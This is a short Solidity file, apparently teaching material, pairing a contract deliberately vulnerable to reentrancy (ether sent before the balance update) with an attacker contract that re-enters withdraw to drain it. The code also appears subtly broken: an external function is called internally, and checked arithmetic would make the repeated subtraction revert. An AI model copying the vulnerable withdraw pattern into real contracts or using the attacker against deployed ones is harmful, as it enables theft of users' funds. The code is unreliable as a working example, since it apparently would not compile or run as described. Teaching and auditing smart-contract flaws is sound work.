// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/// @title BasicReentrancy - Vulnerable to SWC-107
/// @notice Educational example of classic reentrancy vulnerability
/// @dev DO NOT USE IN PRODUCTION
contract BasicReentrancy {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @notice VULNERABLE: State updated after external call
    /// @dev Allows reentrancy attack
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update after external call
        balances[msg.sender] -= amount;
        emit Withdraw(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    receive() external payable {
        deposit();
    }
}

/// @title ReentrancyAttacker - Exploit contract
contract ReentrancyAttacker {
    BasicReentrancy public victim;
    uint256 public attackCount;

    constructor(address _victim) {
        victim = BasicReentrancy(_victim);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        victim.deposit{value: msg.value}();
        victim.withdraw(msg.value);
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether && attackCount < 3) {
            attackCount++;
            victim.withdraw(1 ether);
        }
    }
}
